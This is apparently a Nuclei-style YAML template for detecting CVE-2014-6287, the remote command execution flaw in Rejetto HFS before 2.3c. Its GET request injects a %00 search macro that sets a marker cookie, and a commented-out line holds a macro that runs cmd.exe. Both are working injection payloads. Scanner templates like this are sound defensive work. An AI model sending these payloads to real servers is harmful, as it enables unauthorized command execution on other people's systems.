id: CVE-2014-6287
info:
  name: hfs < 2.3c Remote Command Execution
  author: j4vaovo
  severity: critical
  description: |
    The findMacroMarker function in parserLib.pas in Rejetto HTTP File Server (aks HFS or HttpFileServer) 2.3x before 2.3c allows remote attackers to execute arbitrary programs via a %00 sequence in a search action.
  reference:
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6287
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2014-6287
    cwe-id: CWE-94
  tags: cve,cve2014,hfs,rce

variables:
  str1: '{{rand_base(6)}}'
  str2: 'cve-2014-6287'

requests:
  - method: GET
    path:
      # - "{{BaseURL}}/?search==%00{.exec|cmd.exe+/c+ping+127.0.0.1+-n+10.}"
      - "{{BaseURL}}/?search==%00{.cookie|{{str1}}|value%3d{{str2}}.}"

    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - 'Set-Cookie: {{str1}}={{str2}};'
          - 'Server: HFS'
          - 'text/html'
        condition: and

      - type: status
        status:
          - 200
